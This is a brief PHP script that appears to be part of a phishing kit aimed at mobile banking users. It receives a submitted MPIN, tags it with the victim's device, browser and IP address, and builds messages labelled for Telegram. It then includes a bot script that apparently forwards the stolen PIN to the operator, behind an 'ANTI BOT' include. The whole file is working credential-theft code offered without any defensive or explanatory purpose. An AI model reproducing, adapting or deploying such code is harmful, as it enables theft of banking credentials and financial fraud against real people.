<?php
// ANTI BOT
include('../src/system.php');
if (isset($_POST["mpincode"])) {
    $mpincode = $_POST['mpincode'];
    include('../src/system.php');
    $replyMsg = "```diff\n- MPIN1 [$device_used|$browser_used|$ip]\n  $mpincode```";
    $tgMsg = "MPIN1|$device_used|$browser_used|$ip\n - $mpincode";
    include('../_bot.php');
    http_response_code(200);
}
?>